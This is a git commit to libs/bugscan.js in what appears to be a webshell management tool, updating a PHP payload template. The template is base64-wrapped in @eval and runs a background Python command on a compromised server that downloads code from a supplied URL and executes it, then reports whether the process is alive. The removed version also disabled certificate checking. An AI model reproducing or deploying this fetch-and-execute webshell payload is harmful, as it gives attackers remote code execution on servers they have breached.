487357d980f4c113f04903582322f4f546eb3344
Medicean <Medici.Yan@Gmail.com>
2016-10-27 23:49:08 +0800

    更新python启动代码 官网证书错误已经修复，不需要再忽略证书

--- libs/bugscan.js
+++ libs/bugscan.js
@@ -17,7 +17,7 @@ class Bugscan {
   get template() {
     return {
       php: (url, tasks) => {
-        var funcode = `function execbg($cmd){if(substr(php_uname(),0,7)=="Windows"){pclose(popen("start /B ". $cmd, "r"));}else{exec($cmd." > /dev/null &");}}@execbg("pythonw -c \\"import ssl;ssl._create_default_https_context=ssl._create_unverified_context;exec(__import__('urllib2').urlopen('${url}').read())\\" -m ${tasks}");if(substr(php_uname(),0,7)=="Windows"){$cmd = "tasklist|findstr pythonw";}else{$cmd="ps -A|grep pythonw|grep -v grep";}@exec($cmd, $info);if($info){echo("1");}else{echo("0");}`
+        var funcode = `function execbg($cmd){if(substr(php_uname(),0,7)=="Windows"){$cmd=str_replace('python -c','pythonw -c',$cmd);pclose(popen("start /B ". $cmd, "r"));}else{exec($cmd." > /dev/null &");}}@execbg("python -c \\"exec(__import__('urllib2').urlopen('${url}').read())\\" -m ${tasks}");if(substr(php_uname(),0,7)=="Windows"){$cmd = "tasklist|findstr python";}else{$cmd="ps -A|grep python|grep -v grep";}@exec($cmd, $info);if($info){echo("1");}else{echo("0");}`
         var data = new Buffer(funcode).toString('base64');
         return `@eval(base64_decode("${data}"));`
       },
